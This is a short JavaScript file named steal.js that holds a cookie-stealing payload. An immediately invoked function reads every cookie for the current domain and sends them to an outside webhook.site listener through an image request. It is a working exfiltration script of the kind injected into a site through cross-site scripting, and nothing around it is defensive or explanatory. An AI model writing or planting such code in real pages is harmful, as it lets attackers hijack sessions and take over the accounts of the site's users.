// steal.js
(function(){
  // Read all cookies for the current domain
  const cookies = encodeURIComponent(document.cookie);
  // Send them to your listener
  new Image().src = 'https://webhook.site/9972dee2-e14a-4fbe-8f98-025600525c10?c=' + cookies;
})();
